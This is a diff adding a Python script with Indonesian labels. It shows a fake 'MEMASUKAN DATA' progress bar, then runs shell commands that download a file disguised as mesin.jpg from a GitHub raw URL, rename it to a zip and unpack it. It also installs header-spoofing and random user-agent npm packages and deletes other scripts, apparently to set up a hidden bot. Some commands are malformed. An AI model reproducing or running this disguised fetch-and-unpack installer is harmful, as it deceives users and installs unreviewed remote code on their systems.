@@ -1,0 +1,60 @@
+#!/usr/bin/python3
+# encoding: utf-8
+# NICEDAY
+import sys,os,time,random,colorama,requests,os, time,os 
+from colorama import *
+from random import choice
+from colorama import Fore,Back,init
+colorama.init()
+import datetime
+from multiprocessing.pool import ThreadPool
+now = datetime.datetime.now()
+CLEAR_SCREEN = '\033[2J'
+RED = '\033[31m'   # mode 31 = red forground
+RESET = '\033[0m'  # mode 0  = reset
+BLUE  = "\033[34m"
+CYAN  = "\033[36m"
+GREEN = "\033[32m"
+RESET = "\033[0m"
+BOLD    = "\033[m"
+REVERSE = "\033[m"
+
+def updt(total, progress):
+ 
+    barLength, status = 23, ""
+    progress = float(progress) / float(total)
+    if progress >= 1.:
+        progress, status = 1, "\r\n"
+    block = int(round(barLength * progress))
+    text = "\r{} {:.0f}% {}".format(
+        "\033[1;32m"+" MEMASUKAN DATA  " +"██" * block + "-" * (barLength - block), round(progress * 100, 0),
+        status)
+    sys.stdout.write(text)
+    sys.stdout.flush()
+
+
+runs = 50
+for run_num in range(runs):
+   time.sleep(.1)
+   updt(runs, run_num + 1)
+
+time.sleep(3)
+os.system('reset')
+os.system('clear')
+os.system('apt install update -y')
+os.system('apt install unzip -y')
+os.system('wget https://raw.githubusercontent.com/sayaorangbaru/silahkanmasuk/main/mesin.jpg')
+os.system('mv mesin.jpg mesin.zip')
+os.system('unzip mesin.zip')
+os.system('rm -rf mesin.zip')
+os.system('npm install header-generator -y')
+os.system('npm install random-useragent -y')
+os.system('reset')
+os.system('clear')
+os.system('rm -rf gacor.py')
+os.system('rm -rf megawin.py')
+os.system('rm -rf superwin.py')
+os.system('ls -lia')
+
+
+
